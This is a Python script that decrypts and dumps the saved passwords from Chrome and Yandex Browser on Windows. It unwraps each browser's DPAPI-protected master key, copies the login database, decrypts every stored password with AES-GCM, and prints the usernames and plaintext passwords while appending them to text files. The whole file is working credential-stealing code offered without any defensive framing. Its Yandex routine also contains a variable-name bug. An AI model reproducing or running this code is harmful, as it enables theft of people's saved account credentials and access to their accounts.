import json
import os
import shutil
import sqlite3
import base64
from Cryptodome.Cipher import AES
import win32crypt


def get_master_key(path):
    with open(os.environ['USERPROFILE'] + os.sep + r'AppData\Local' + os.sep + path, "r",
              encoding='utf-8') as f:
        local_state = f.read()
        local_state = json.loads(local_state)
    master_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
    master_key = master_key[5:]  # removing DPAPI
    master_key = win32crypt.CryptUnprotectData(master_key, None, None, None, 0)[1]
    return master_key


def chrome():
    master_key = get_master_key(r'Google\Chrome\User Data\Local State')
    path = f"{os.getenv('LOCALAPPDATA')}\\Google\\Chrome\\User Data\\Default"
    data_path = "Login Data For Account"

    shutil.copy(f'{path}\\{data_path}', data_path)

    with sqlite3.connect(data_path) as con:
        cur = con.cursor()
        with open('chrome_pswds.txt', 'a') as f:
            for id, signon_realm, username_value, password_value in cur.execute(
                    'SELECT id, signon_realm, username_value, password_value '
                    'FROM logins '
                    'WHERE signon_realm!="tags-list://user-tags" AND username_value!="" AND username_value IS NOT NULL'):
                # print("ID", id)
                # print("SIGNON_REALM", signon_realm)
                # print("USERNAME", username_value)
                # print("PASSWORD", password_value)

                iv = password_value[3:15]
                password = password_value[15:]
                print("Login: ", username_value)
                # print("Encoded Password: ", password)
                pswd = ''
                if iv != b'' and password != b'':
                    cipher = AES.new(master_key, AES.MODE_GCM, iv)
                    decrypted_pass = cipher.decrypt(password)
                    pswd =  decrypted_pass[:-16].decode()
                    print("DECODED: " + pswd)
                f.write(f"{signon_realm}:{username_value}{f':{pswd}' if pswd !='' else ''}\n")


def yandex():
    master_key = get_master_key(r'Yandex\YandexBrowser\User Data\Local State')
    path = f"{os.getenv('LOCALAPPDATA')}\\Yandex\\YandexBrowser\\User Data\\Default"
    data_path = "Ya Passman Data"

    shutil.copy(f'{path}\\{data_path}', data_path)

    with sqlite3.connect(data_path) as con:
        cur = con.cursor()
        with open('yandex_pswds.txt', 'a') as f:
            for id, signon_realm, username_value, password_value in cur.execute(
                    'SELECT id, signon_realm, username_value, password_value '
                    'FROM logins '
                    'WHERE signon_realm!="tags-list://user-tags" AND username_value!="" AND username_value IS NOT NULL'):
                # print("ID", id)
                # print("SIGNON_REALM", signon_realm)
                # print("USERNAME", username_value)
                # print("PASSWORD", password_value)

                iv = password_value[3:15]
                password = password_value[15:]
                print("Login: ", username_value)
                # print("Encoded Password: ", password)

                pawd = ''
                if iv != b'' and password != b'':
                    cipher = AES.new(master_key, AES.MODE_GCM, iv)
                    decrypted_pass = cipher.decrypt(password)
                    pswd = decrypted_pass[:-16]
                    print("DECODED: ", pswd)
                f.write(f"{signon_realm}:{username_value}{f':{pswd}' if pswd !='' else ''}\n")


if __name__ == '__main__':
    print('========GOOGLE CHROME======')
    chrome()
    print('========YANDEX BROWSER======')
    yandex()
    input()

